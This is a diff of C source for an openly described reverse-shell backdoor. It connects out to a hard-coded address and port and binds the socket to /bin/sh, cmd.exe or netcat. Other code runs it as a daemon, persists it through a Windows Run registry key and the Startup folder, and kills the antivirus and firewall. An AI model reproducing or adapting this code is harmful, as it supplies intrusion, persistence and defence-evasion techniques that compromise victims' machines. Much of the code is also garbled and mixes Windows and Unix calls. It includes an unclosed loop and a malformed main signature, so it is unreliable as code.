@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <signal.h>
 #include <unistd.h>
 #include <string.h>
 #include <errno.h>
@@ -8,10 +9,12 @@
 #include <time.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <X11/Xlib.h>
 
 #define remote_addr "127.0.0.1"
-#define remote_port 55766
 
+#define remote_port 55766
+#define X TRUE
 /* struct of cong=figurations to target. */
 
   typedef struct client {
@@ -35,7 +38,16 @@
 
   x = 1;
 
-  //function  to disable antivirus. /
+  void error (char *err)
+
+ {
+
+  perror(err);
+  exit(EXIT_FAILURE);
+
+ } /* exit without exceptions... and keep the routine.
+
+  //function  to disable antivirus. */
 
 void kill_antivirus()
 
@@ -64,38 +76,75 @@ void kill_firewall()
 
   {
 
-   execve("firewall.vbs",0,0);
+   execve("firewall.vbs", 0, 0);
 
-   exit (EXIT_SUCCESS);
+   return;
 
   }
 
-  // function that auto copy the software into the register of target machine 
+  // function that auto copy the software into the register of target machine
 
-void auto_copy() 
+void auto_copy()
 
   {
 
-     system("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wins32.exe"); 
+     system("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wins32.exe");
      return;
 
   }
 
 void copy_to_registry()
-  
-  {
 
-    system("copy /Y meuarquivo.exe C:\Documents and Settings\All Users\Menu Iniciar\Programas\Inicializar");
-    return;  
-  
+  {
+    execve("copy /Y meuarquivo.exe C:\Documents and Settings\All Users\Menu Iniciar\Programas\Inicializar",0,0);
+    return;
   }
 
-  /* create connection */
+
+  /*função para o programa rodar em background, como um deamon
+
+   create connection */
   void shell()
 
   {
     //int x;
     struct sockaddr_in s;
+
+    XFreeCursor;
+
+    pid_t pid;
+	pid = fork();
+
+	if(pid < 0 )
+        exit(EXIT_FAILURE);
+
+    if(pid > 0)
+        exit(EXIT_SUCCESS);
+
+    if (setsid() < 0)
+        exit(EXIT_FAILURE);
+
+        signal(SIGCHLD, SIG_IGN);
+        signal(SIGHUP, SIG_IGN);
+
+        pid = fork();
+
+        if (pid < 0)
+            exit(EXIT_FAILURE);
+
+        if (pid > 0)
+            exit(EXIT_SUCCESS);
+
+        umask(0);
+
+        chdir("/");
+
+        int k;
+
+        for (k = sysconf(_SC_OPEN_MAX); k >= 0; k--)
+
+        {
+            close(k);
 
     s.sin_family = AF_INET;
     s.sin_addr.s_addr = inet_addr(remote_addr);
@@ -108,38 +157,37 @@ void copy_to_registry()
     if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
     perror("setsockopt(SO_REUSEADDR) failed");
 
-    send(x,"\nConnected\n",12,0);
+    send(x,"\nConnected\n",12,0),send(x,"\n#root > /n",7,0);
 
-    dup2(x, 0);
-    dup2(x, 1);
-    dup2(x, 2);
+    dup2(x, 0),dup2(x, 1),dup2(x, 2);
 
-    execve("/bin/sh", 0, 0);
-    execve("cmd.exe", 0, 0);
-    execve("/netcat", 0, 0);
+    execve("/bin/sh", 0, 0),execve("cmd.exe", 0, 0),execve("netcat", 0, 0);
 
- }
+    return;
+
+   }
+}
+
+
    /* execute the program */
 
-   int main(int argc, char *argv[])
+   int main(int argc, char *argv)
 
    {
-
     while(1)
 
     shell();
+
     auto_copy();
     copy_to_registry();
     kill_antivirus();
     kill_firewall();
 
-
-    }
-
-
+    return;
+   }
 
 
-  /* static const unsigned char **ip;
+  /* static const unsigned char *ip;
    static const unsigned long int *port;
    static const unsigned char *cmd;
 
